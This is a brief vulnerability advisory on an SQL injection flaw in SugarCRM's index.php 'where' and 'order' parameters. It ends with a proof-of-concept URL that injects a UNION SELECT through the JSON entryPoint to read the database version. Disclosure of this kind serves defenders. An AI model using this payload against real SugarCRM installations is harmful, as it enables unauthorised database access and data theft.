Vulnerability Details:
High-Tech Bridge SA Security Research Lab has discovered vulnerability in SugarCRM, which can be exploited to perform sql injection attacks.

Input passed via the "where" and "order" GET parameters to index.php is not properly sanitised before being used in a SQL query.
This can be exploited to manipulate SQL queries by injecting arbitrary SQL code.

The following PoC code is available:

http://[host]/index.php?entryPoint=json&action=get_full_list&module=Leads&where=0%29%20union%20select%20version%28%29,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71%20--%20
